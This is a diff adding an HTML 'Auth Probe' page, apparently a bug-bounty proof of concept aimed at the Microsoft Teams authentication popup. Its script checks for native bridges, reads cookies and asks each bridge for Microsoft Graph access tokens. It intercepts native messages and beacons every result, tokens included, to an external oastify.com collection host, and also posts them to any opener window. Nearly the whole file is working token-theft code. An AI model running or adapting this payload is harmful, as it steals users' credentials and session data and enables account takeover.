@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Auth Probe</title></head>
+<body>
+<p id="status">Probing popup context...</p>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<script>
+(function() {
+    const OAST = 'jbyumdh8pj5q7lbruiihcqbkxb32r1fq.oastify.com';
+    const S = document.getElementById('status');
+    const results = {};
+
+    function exfil(tag, data) {
+        const d = typeof data === 'string' ? data : JSON.stringify(data);
+        new Image().src = 'https://' + OAST + '/?t=' + tag + '&d=' + encodeURIComponent(d.substring(0, 2000)) + '&ts=' + Date.now();
+    }
+
+    // Probe available APIs in popup context
+    results.hasNI = !!window.nativeInterface;
+    results.niProps = results.hasNI ? Object.getOwnPropertyNames(window.nativeInterface).length : 0;
+    results.hasWebkitListener = !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener);
+    results.hasWebkitNAA = !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.nestedAppAuthBridge);
+    results.hasNAA = !!window.nestedAppAuthBridge;
+    results.hasExternal = !!(window.external && window.external.getAadToken);
+    results.hasExternalObj = typeof window.external;
+    results.href = window.location.href;
+    results.origin = window.origin;
+    results.parentEqSelf = window.parent === window;
+    results.openerExists = !!window.opener;
+    results.cookies = document.cookie.substring(0, 200);
+
+    S.textContent = JSON.stringify(results, null, 2);
+    exfil('popup_probe', results);
+
+    // If NI is available in popup context, try to get token
+    if (results.hasNI) {
+        exfil('popup_has_ni', 'NI with ' + results.niProps + ' props');
+
+        var origNM = window.onNativeMessage;
+        window.onNativeMessage = function(evt) {
+            var data = evt && evt.data ? evt.data : evt;
+            exfil('popup_nm_intercept', data);
+            S.textContent += '\n[NM] ' + JSON.stringify(data).substring(0, 300);
+            if (origNM) return origNM.call(window, evt);
+        };
+
+        // Try getAuthToken from popup context (different permissions?)
+        window.nativeInterface.framelessPostMessage(JSON.stringify({
+            func: 'authentication.getAuthToken',
+            id: 9900,
+            args: [['https://graph.microsoft.com']]
+        }));
+
+        // Try getContext
+        window.nativeInterface.framelessPostMessage(JSON.stringify({
+            func: 'getContext',
+            id: 9901,
+            args: []
+        }));
+    }
+
+    // If window.external.getAadToken is available (meeting options context)
+    if (results.hasExternal) {
+        exfil('popup_has_external', 'getAadToken available!');
+        window.external.getAadToken(function(token) {
+            exfil('popup_aad_token', token);
+            S.textContent += '\n[TOKEN] ' + String(token).substring(0, 100);
+            try { microsoftTeams.authentication.notifySuccess(token); } catch(e) {}
+        }, function(err) {
+            exfil('popup_aad_err', err);
+        }, 'https://graph.microsoft.com');
+    }
+
+    // If webkit listener available, try direct getAadToken
+    if (results.hasWebkitListener) {
+        exfil('popup_has_webkit', 'listener available');
+        try {
+            window.webkit.messageHandlers.listener.postMessage({
+                event: 'getAadToken',
+                requestId: 9950,
+                resource: 'https://graph.microsoft.com'
+            });
+        } catch(e) {
+            exfil('popup_webkit_err', String(e));
+        }
+    }
+
+    // If nestedAppAuthBridge available in popup
+    if (results.hasNAA) {
+        exfil('popup_has_naa', 'NAA bridge in popup!');
+        try {
+            window.nestedAppAuthBridge.addEventListener('message', function(resp) {
+                exfil('popup_naa_response', resp);
+            });
+            var r = window.nestedAppAuthBridge.postMessage(JSON.stringify({
+                messageType: 'NestedAppAuthRequest',
+                method: 'GetToken',
+                requestId: 'popup-' + Date.now(),
+                clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+                scope: 'User.Read openid profile',
+                correlationId: 'popup-corr-' + Date.now()
+            }));
+            if (r && r.then) {
+                r.then(function(resp) { exfil('popup_naa_ok', resp); })
+                 .catch(function(e) { exfil('popup_naa_err', String(e)); });
+            }
+        } catch(e) {
+            exfil('popup_naa_throw', String(e));
+        }
+    }
+
+    // Try to communicate with opener
+    if (window.opener) {
+        try {
+            window.opener.postMessage({ type: 'popup-probe', results: results }, '*');
+        } catch(e) {}
+    }
+
+    // Auto-close after 5 seconds, notifying success with probe results
+    setTimeout(function() {
+        try {
+            microsoftTeams.app.initialize().then(function() {
+                microsoftTeams.authentication.notifySuccess(JSON.stringify(results));
+            }).catch(function() {
+                microsoftTeams.authentication.notifySuccess(JSON.stringify(results));
+            });
+        } catch(e) {
+            exfil('popup_notify_err', String(e));
+        }
+    }, 4000);
+})();
+</script>
+</body>
+</html>
